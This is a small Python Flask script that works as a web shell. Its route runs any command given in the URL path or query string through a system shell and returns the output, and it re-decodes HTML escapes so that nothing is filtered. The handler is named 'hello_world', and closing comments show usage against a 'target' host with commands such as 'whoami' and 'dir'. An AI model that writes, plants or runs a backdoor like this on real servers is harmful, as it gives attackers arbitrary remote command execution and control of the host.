import subprocess
from flask import Flask, request,escape

app = Flask(__name__)

@app.route('/cmd/<path:variable>')
def hello_world(variable):
	cmd = escape(variable)
	
	## join arguments from request
	if request.args:
		cmd += '?'
		cmd += '&'.join([f'{k}={v}' for k, v in request.args.items()])
		
	## remove HTML Character Entities from request command
	saida = html_decode(str(cmd))
	
	## executing command
	result = subprocess.check_output(saida, shell=True)
	
	return (result)
	
def html_decode(s):
	"""
	Returns the ASCII decoded version of the given HTML string. This does
	NOT remove normal HTML tags like <p>.
	"""
	htmlCodes = (
			("'", '&#39;'),
			('"', '&quot;'),
			('>', '&gt;'),
			('<', '&lt;'),
			('&', '&amp;')
		)
	for code in htmlCodes:
		s = s.replace(code[1], code[0])
	return s

if __name__ == '__main__':
	app.run()
	
	
## Usage: http://target/cmd/whoami
## Usage: http://target/cmd/cd.. & dir

# by: Fabio Delgado
# modified: 31/08/2020
	
